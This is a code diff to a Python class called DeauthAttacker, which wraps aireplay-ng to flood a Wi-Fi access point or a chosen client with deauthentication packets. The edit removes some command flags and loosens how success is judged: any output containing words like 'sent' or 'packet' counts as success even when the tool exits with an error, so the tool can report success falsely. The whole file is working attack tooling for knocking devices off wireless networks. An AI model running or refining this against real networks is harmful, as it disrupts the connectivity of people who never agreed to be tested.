@@ -97,16 +97,15 @@ class DeauthAttacker:
             'aireplay-ng',
             '--deauth', str(count),
             '-a', bssid,
-            '-D',  # Don't wait for ACK (faster)
             self.interface
         ]
 
         # Add client if specified
         if client:
             cmd.extend(['-c', client])
-
-        # Add reason code
-        cmd.extend(['-r', str(reason)])
+        
+        # Note: -D flag removed as it can cause issues with some interfaces
+        # Note: -r flag removed as it's not always supported and default reason (7) is fine
 
         try:
             # Run aireplay-ng
@@ -118,9 +117,17 @@ class DeauthAttacker:
             )
 
             # Parse output for packet count
+            # aireplay-ng returns 0 on success, but also outputs to stderr
+            # Check both stdout and stderr for success indicators
+            output = (result.stdout + result.stderr).lower()
             packets_sent = count
-
-            if result.returncode == 0:
+            
+            # Check for success indicators in output
+            success_indicators = ['sending deauth', 'sent', 'packet']
+            has_success = any(indicator in output for indicator in success_indicators)
+            
+            # aireplay-ng can return non-zero but still send packets
+            if result.returncode == 0 or has_success:
                 target = f"client {client}" if client else "all clients"
                 return DeauthResult(
                     success=True,
@@ -129,11 +136,12 @@ class DeauthAttacker:
                     message=f"Sent {packets_sent} deauth packets to {target} on {bssid}"
                 )
             else:
+                error_msg = result.stderr if result.stderr else result.stdout
                 return DeauthResult(
                     success=False,
                     packets_sent=0,
                     duration=0,
-                    message=f"Deauth failed: {result.stderr}"
+                    message=f"Deauth failed: {error_msg[:200] if error_msg else 'Unknown error'}"
                 )
 
         except subprocess.TimeoutExpired:
